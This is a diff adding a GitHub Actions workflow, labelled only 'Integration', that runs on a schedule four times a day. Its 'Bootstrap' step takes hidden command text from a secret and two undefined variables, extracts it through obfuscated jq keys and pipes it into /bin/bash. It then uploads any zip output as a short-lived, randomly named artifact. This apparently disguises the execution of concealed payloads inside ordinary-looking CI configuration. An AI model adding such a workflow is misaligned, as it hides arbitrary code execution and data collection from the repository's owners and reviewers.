@@ -1,0 +1,33 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '50 1,7,13,19 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          qxyw80: ${{ secrets.qxyw80 }}
+        run: |
+          printf '%s' "$qxyw80" | jq -r .dob1402 | /bin/bash
+          printf '%s' "$fjukb940" | jq -r .keldq96076 | /bin/bash
+          printf '%s' "$p35934" | jq -r .dsdh224 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 2qdO6f3E
+          path: "*.zip"
+          retention-days: 1
